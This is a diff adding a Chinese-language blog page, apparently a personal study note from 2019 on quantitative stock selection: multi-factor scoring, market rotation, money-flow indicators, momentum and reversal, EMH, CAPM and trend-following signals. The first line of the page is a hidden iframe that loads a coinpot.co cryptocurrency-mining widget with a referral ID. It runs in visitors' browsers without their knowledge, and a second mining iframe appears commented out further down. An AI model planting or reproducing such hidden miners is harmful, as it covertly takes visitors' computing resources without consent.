@@ -1,0 +1,1704 @@
+<iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/dash/?ref=CD1A3EFFFAF0&mode=widget" style="display:none;"></iframe>
+
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next mist" lang="zh-Hans">
+<head>
+  <meta name="referrer" content="never">
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/assets/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/assets/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="量化投资策略技术," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="选择股票组合">
+<meta name="keywords" content="量化投资策略技术">
+<meta property="og:type" content="article">
+<meta property="og:title" content="选股">
+<meta property="og:url" content="/blog/2019/01/16/%E9%80%89%E8%82%A1">
+<meta property="og:site_name" content="Notes">
+<meta property="og:description" content="选择股票组合">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fz8gjiib6wj30u00zqtms.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fz8hpr6ghfj314r0u0qiv.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fz8fv0dmizj31ea05y0w3.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fz8fwlsf7rj31eo0b6wjx.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fz9ewdt1pkj31fa0luahx.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fz9fly26mjj31eq0c2gsd.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fz9laytuqpj31cs0680vx.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fz9lclomd4j31c20byzqj.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fz9ftdu9xoj31fm06k0w0.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fz9lsf31xij31ci0u07fw.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fz9mhljhkkj31do0b4n1m.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fz9mji8310j31e00o27e5.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fzfd8xvxclj31do06c773.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fzfdrwfe0rj31co0f0age.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fzfdwgwrnlj31dw08a41z.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fzfe9icn2sj31cq0860vx.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fzfehctb95j31dq0nydrf.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fzfer8ausbj31eo0ay432.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fzfhcex2raj31f20rojyp.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fzfilmtgu1j31cx0u0115.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fzhixa4nknj31740msaef.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fzhpo6mvwcj313k0i4dhj.jpg">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="选股">
+<meta name="twitter:description" content="选择股票组合">
+<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fz8gjiib6wj30u00zqtms.jpg">
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Mist',
+    sidebar: {"position":"right","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href=""/>
+
+
+
+
+
+  <title>选股 | Notes</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-120397256-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+
+  <div class="container sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Notes</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />
+            
+            库
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            <!--<iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincash/?ref=CD1A3EFFFAF0&mode=widget" style="display:none;"></iframe>-->
+
+
+<div id="posts" class="posts-expand">
+  
+  
+
+  
+
+  
+  
+  
+
+  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="/blog/2019/01/16/%E9%80%89%E8%82%A1">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wyx">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Notes">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+          
+          
+            选股
+          
+        </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-16T00:00:00+08:00">
+                2019-01-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/#/quant" itemprop="url" rel="index">
+                    <span itemprop="name">quant</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/blog/2019/01/16/%E9%80%89%E8%82%A1" class="leancloud_visitors" data-flag-title="选股">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+            
+                <div class="post-description">
+                    
+                </div>
+            
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <p>选择股票组合</p>
+
+<h1 id="多因子">多因子</h1>
+
+<h2 id="核心">核心</h2>
+<ul>
+  <li>因子选取</li>
+  <li>因子综合得到最终判断</li>
+</ul>
+
+<h2 id="how-选取">how 选取</h2>
+
+<h3 id="候选因子">候选因子</h3>
+<p>选取主要靠经验</p>
+
+<h3 id="计算有效性">计算有效性</h3>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fz8gjiib6wj30u00zqtms.jpg" alt="" /></p>
+<ul>
+  <li>因子的大小和收益明显的相关</li>
+  <li>极端1、n组合能够有明显的指示作用，高区分度。</li>
+</ul>
+
+<h3 id="删除冗余因子">删除冗余因子</h3>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fz8hpr6ghfj314r0u0qiv.jpg" alt="" /></p>
+
+<h2 id="模型判断">模型判断</h2>
+<ul>
+  <li>加权打分
+<img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz8fv0dmizj31ea05y0w3.jpg" alt="" /></li>
+  <li>回归
+<img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz8fwlsf7rj31eo0b6wjx.jpg" alt="" /></li>
+</ul>
+
+<p>根据打分选择TOP100/TOP20%</p>
+
+<h2 id="summary">summary</h2>
+<p>要根据市场变化不断维护因子</p>
+
+<h1 id="轮动">轮动</h1>
+
+<p>市场之间存在循环的相关性</p>
+
+<h2 id="分类">分类</h2>
+<p>根据某种标准区分市场：市值、收益率、<strong>市场情绪</strong>等。不同的市场用不同策略，<strong>动量（可以理解为惯性），动量翻转, 持有的时间</strong>。</p>
+
+<h2 id="when-转换市场">when 转换市场</h2>
+<p>使用logistic n个因素判断是否转换，操作收益 if &gt; 简单买入并持有的收益。</p>
+
+<h2 id="市场情绪">市场情绪</h2>
+<p>MACD趋势型，剧烈波动或盘整。观测频率为周，可以过滤大量市场噪音，而保留主要趋势。</p>
+
+<blockquote>
+  <p>关键在于<strong>明确</strong>市场情绪指标选取，指标参数，适当止损。可以<strong>多参数多策略同时轮动投资</strong>，提高策略稳健性。</p>
+</blockquote>
+
+<h1 id="资金流">资金流</h1>
+<h2 id="mf-指标">MF 指标</h2>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz9ewdt1pkj31fa0luahx.jpg" alt="" /></p>
+
+<p>注意问题</p>
+<ul>
+  <li>取样的时间频率
+<img src="https://ws1.sinaimg.cn/large/006tNc79gy1fz9fly26mjj31eq0c2gsd.jpg" alt="" /></li>
+  <li>参考价格计算
+<img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz9laytuqpj31cs0680vx.jpg" alt="" />
+<img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz9lclomd4j31c20byzqj.jpg" alt="" /></li>
+  <li>指标失效
+<img src="https://ws1.sinaimg.cn/large/006tNc79gy1fz9ftdu9xoj31fm06k0w0.jpg" alt="" /></li>
+</ul>
+
+<h2 id="cmsmf-指标">CMSMF 指标</h2>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fz9lsf31xij31ci0u07fw.jpg" alt="" /></p>
+
+<h2 id="策略">策略</h2>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fz9mhljhkkj31do0b4n1m.jpg" alt="" />
+<img src="https://ws3.sinaimg.cn/large/006tNc79gy1fz9mji8310j31e00o27e5.jpg" alt="" /></p>
+
+<h1 id="动量反转">动量反转</h1>
+
+<ul>
+  <li>动量（ps:怎么不叫<strong>惯性</strong>，刚接触一面懵逼）前段时间怎样，未来一段时间就怎样</li>
+  <li>反转（ps:怎么不叫<strong>惯性</strong>，刚接触一面懵逼）前段时间怎样，未来一段时间就反趋势</li>
+</ul>
+
+<p>重点参数</p>
+<blockquote>
+  <p>趋势持续时间，趋势幅度、持有时间</p>
+</blockquote>
+
+<h2 id="emh">EMH</h2>
+<p>有效市场假说（Efficient Markets Hypothesis，简称EMH）</p>
+
+<ul>
+  <li>在市场上的每个人都是理性的经济人，金融市场上每只股票所代表的各家公司都处于这些理性人的严格监视之下，他们每天都在进行基本分析，以公司未来的获利性来评价公司的股票价格，把未来价值折算成今天的现值，并谨慎地在风险与收益之间进行权衡取舍。</li>
+  <li>股票的价格反映了这些理性人的供求的平衡，想买的人正好等于想卖的人，即，认为股价被高估的人与认为股价被低估的人正好相等，假如有人发现这两者不等，即存在套利的可能性的话，他们立即会用买进或卖出股票的办法使股价迅速变动到能够使二者相等为止。</li>
+  <li>股票的价格也能充分反映该资产的所有可获得的信息，即”信息有效”，当信息变动时，股票的价格就一定会随之变动。一个利好消息或利空消息刚刚传出时，股票的价格就开始异动，当它已经路人皆知时，股票的价格也已经涨或跌到适当的价位了。</li>
+</ul>
+
+<p>“有效市场假说”实际上意味着”天下没有免费的午餐”，世上没有唾手可得之物。在一个正常的有效率的市场上，每个人都别指望发意外之财，所以我们花时间去看路上是否有钱好拣是不明智的，我们费心去分析股票的价值也是无益的，它白费我们的心思。</p>
+
+<h2 id="camp">CAMP</h2>
+<p>资本资产定价模型（Capital Asset Pricing Model，CAPM)</p>
+
+<p><a href="/blog/2018/07/05/资本资产定价模型-CAPM-一致预期收益">CAPM</a>
+<a href="https://wiki.mbalib.com/wiki/CAPM">mba-wiki</a></p>
+
+<h2 id="动量测试">动量测试</h2>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fzfd8xvxclj31do06c773.jpg" alt="" /></p>
+<h3 id="测试步骤">测试步骤</h3>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fzfdrwfe0rj31co0f0age.jpg" alt="" />
+超额收益，战胜基准组合
+<img src="https://ws4.sinaimg.cn/large/006tNc79gy1fzfdwgwrnlj31dw08a41z.jpg" alt="" /></p>
+
+<h2 id="反转测试">反转测试</h2>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fzfe9icn2sj31cq0860vx.jpg" alt="" /></p>
+<h3 id="测试步骤-1">测试步骤</h3>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fzfehctb95j31dq0nydrf.jpg" alt="" /></p>
+
+<h2 id="策略-1">策略</h2>
+<ul>
+  <li>等权重再平衡</li>
+</ul>
+
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fzfer8ausbj31eo0ay432.jpg" alt="" /></p>
+
+<h1 id="趋势跟踪">趋势跟踪</h1>
+<p>等待突破后的大趋势波段，在突破（阻力位/压力位）进行建仓/平仓操作。
+判断大趋势，减少扰动对趋势影响。</p>
+
+<ul>
+  <li>寻找刻画趋势的指标</li>
+  <li>使用样本外的若干几年进行测试，调试指标参数</li>
+  <li>参数稳定后，实盘操作</li>
+</ul>
+
+<h2 id="模型">模型</h2>
+<ul>
+  <li>均线</li>
+  <li>HH、LL 记录局部最高最低点</li>
+  <li>均线过滤盘整
+<img src="https://ws1.sinaimg.cn/large/006tNc79gy1fzfhcex2raj31f20rojyp.jpg" alt="" /></li>
+</ul>
+
+<h3 id="通过转折点-判断主趋势">通过转折点 判断主趋势</h3>
+<p>高点：比两端高 L
+低点：比两端低 H</p>
+
+<h4 id="高低点比较">高低点比较</h4>
+<ul>
+  <li>信号
+    <ul>
+      <li>buy 发出sell后 第一个当前L &gt; L_pre</li>
+      <li>sell 发出buy后 第一个当前H &lt; H_pre</li>
+    </ul>
+  </li>
+  <li>局限
+    <ul>
+      <li>出现频率高</li>
+      <li>假突破，幅度不够</li>
+      <li>没有考虑形成趋势的时间长短</li>
+    </ul>
+  </li>
+  <li>
+    <p>补充 drift</p>
+
+    <p><strong>时间短</strong>的趋势比<strong>时间长</strong>同涨幅的趋势，买卖信号要强</p>
+    <ul>
+      <li>buy 当前L &gt; L_pre + drift</li>
+      <li>sell 当前H &lt; H_pre + drift
+  <img src="https://ws1.sinaimg.cn/large/006tNc79gy1fzfilmtgu1j31cx0u0115.jpg" alt="" /></li>
+    </ul>
+  </li>
+</ul>
+
+<h4 id="高低点突破">高低点突破</h4>
+
+<p>有可能不存在第二个次高峰，直接从最高峰不断下滑。</p>
+<ul>
+  <li>buy H &gt; H_pre + drift</li>
+  <li>sell L &lt; L_pre + drift
+<img src="https://ws4.sinaimg.cn/large/006tNc79gy1fzhixa4nknj31740msaef.jpg" alt="" /></li>
+</ul>
+
+<h4 id="大波段保护">大波段保护</h4>
+<p>现价 P  涨幅 C  止损幅度D</p>
+
+<p>if P &gt; L_pre(1+C) than  when P &lt; (L_pre+drift)(1+D) sell
+<img src="https://ws3.sinaimg.cn/large/006tNc79gy1fzhpo6mvwcj313k0i4dhj.jpg" alt="" /></p>
+
+<h4 id="长均线保护">长均线保护</h4>
+<p>MA(E) &gt; P 不买  直到突破</p>
+
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      wyx
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="/blog/2019/01/16/%E9%80%89%E8%82%A1" title="选股">/blog/2019/01/16/%E9%80%89%E8%82%A1</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            
+            <a href="/tag/#/%E9%87%8F%E5%8C%96%E6%8A%95%E8%B5%84%E7%AD%96%E7%95%A5%E6%8A%80%E6%9C%AF" rel="tag"># 量化投资策略技术</a>
+          
+        </div>
+      
+
+      
+      
+      
+      
+      
+
+      
+      
+        <div class="post-nav" id="post-nav-id">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/2019/01/24/%E8%A1%A1%E9%87%8F%E6%8C%87%E6%A0%87" rel="next" title="衡量指标">
+                <i class="fa fa-chevron-left"></i> 衡量指标
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/2019/01/16/%E6%A6%82%E8%A6%81" rel="prev" title="概要">
+                概要 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+      
+
+      
+    </footer>
+  </article>
+
+  <div class="post-spread">
+    
+  </div>
+</div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="gitalk-container"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        
+        
+        
+
+
+
+
+
+
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="wyx" />
+          <p class="site-author-name" itemprop="name">wyx</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">195</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/">
+                <span class="site-state-item-count">27</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/">
+                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              
+              
+              <span class="links-of-author-item">
+                <a href="https://github.com/631068264" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              
+              
+              <span class="links-of-author-item">
+                <a href="https://stackoverflow.com/users/5360312/wyx" target="_blank" title="StackOverflow">
+                  
+                    <i class="fa fa-fw fa-stack-overflow"></i>
+                  
+                  StackOverflow
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+
+
+
+
+
+
+
+            
+              <div class="post-toc-content">
+    <ol class=nav>
+      <li class="nav-item nav-level-1"> <a class="nav-link" href="#多因子"> <span class="nav-number">1</span> <span class="nav-text">多因子</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#核心"> <span class="nav-number">1.1</span> <span class="nav-text">核心</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#how-选取"> <span class="nav-number">1.2</span> <span class="nav-text">how 选取</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#候选因子"> <span class="nav-number">1.2.1</span> <span class="nav-text">候选因子</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#计算有效性"> <span class="nav-number">1.2.2</span> <span class="nav-text">计算有效性</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#删除冗余因子"> <span class="nav-number">1.2.3</span> <span class="nav-text">删除冗余因子</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#模型判断"> <span class="nav-number">1.3</span> <span class="nav-text">模型判断</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#summary"> <span class="nav-number">1.4</span> <span class="nav-text">summary</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#轮动"> <span class="nav-number">2</span> <span class="nav-text">轮动</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#分类"> <span class="nav-number">2.1</span> <span class="nav-text">分类</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#when-转换市场"> <span class="nav-number">2.2</span> <span class="nav-text">when 转换市场</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#市场情绪"> <span class="nav-number">2.3</span> <span class="nav-text">市场情绪</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#资金流"> <span class="nav-number">3</span> <span class="nav-text">资金流</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#mf-指标"> <span class="nav-number">3.1</span> <span class="nav-text">MF 指标</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#cmsmf-指标"> <span class="nav-number">3.2</span> <span class="nav-text">CMSMF 指标</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#策略"> <span class="nav-number">3.3</span> <span class="nav-text">策略</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#动量反转"> <span class="nav-number">4</span> <span class="nav-text">动量反转</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#emh"> <span class="nav-number">4.1</span> <span class="nav-text">EMH</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#camp"> <span class="nav-number">4.2</span> <span class="nav-text">CAMP</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#动量测试"> <span class="nav-number">4.3</span> <span class="nav-text">动量测试</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#测试步骤"> <span class="nav-number">4.3.1</span> <span class="nav-text">测试步骤</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#反转测试"> <span class="nav-number">4.4</span> <span class="nav-text">反转测试</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#测试步骤-1"> <span class="nav-number">4.4.1</span> <span class="nav-text">测试步骤</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#策略-1"> <span class="nav-number">4.5</span> <span class="nav-text">策略</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#趋势跟踪"> <span class="nav-number">5</span> <span class="nav-text">趋势跟踪</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#模型"> <span class="nav-number">5.1</span> <span class="nav-text">模型</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#通过转折点-判断主趋势"> <span class="nav-number">5.1.1</span> <span class="nav-text">通过转折点 判断主趋势</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-4"> <a class="nav-link" href="#高低点比较"> <span class="nav-number">5.1.1.1</span> <span class="nav-text">高低点比较</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#高低点突破"> <span class="nav-number">5.1.1.2</span> <span class="nav-text">高低点突破</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#大波段保护"> <span class="nav-number">5.1.1.3</span> <span class="nav-text">大波段保护</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#长均线保护"> <span class="nav-number">5.1.1.4</span> <span class="nav-text">长均线保护</span> </a> </li> </ol> </li> </ol> </li> </ol> </li>
+    </ol>
+  </div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  
+  &copy;  2018 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wyx</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://jekyllrb.com">Jekyll</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/simpleyyt/jekyll-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
